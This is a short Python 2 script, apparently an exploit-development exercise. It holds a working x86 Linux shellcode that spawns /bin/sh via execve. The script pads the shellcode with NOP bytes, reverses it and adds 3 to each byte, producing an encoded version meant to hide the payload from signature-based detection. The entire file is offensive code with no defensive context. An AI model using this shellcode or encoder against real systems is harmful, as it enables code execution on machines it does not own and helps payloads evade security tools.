#!/usr/bin/python



shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print "[+]Length of original shellcode:", len(shellcode)

if (len(shellcode) % 4)!= 0:
	
	  shellcode += ("\x90" * (4- len(shellcode) % 4))

	  print "[+]Adding NOP's to the original shellcode"

t =[]
w =[]
for i in range(0, len(shellcode)):
	s = ord(shellcode[i])
	t.append(s)
	y = s + 3
	w.append(y)

print "-----------------------------------------------------------------------"
print "[+]Length of the Final shellcode:", len(shellcode)
print "[+]Original shellcode..:", (", ".join(hex(c) for c in t[0::]))

print "-------------------------Reverse the Original shellcode-------------------------------------------"
print (", ".join(hex(c) for c in t[::-1]))

print "-------------------------Shellcode after adding 3 to each byte----------------------------------"
print (", ".join(hex(c) for c in w[::-1]))






	





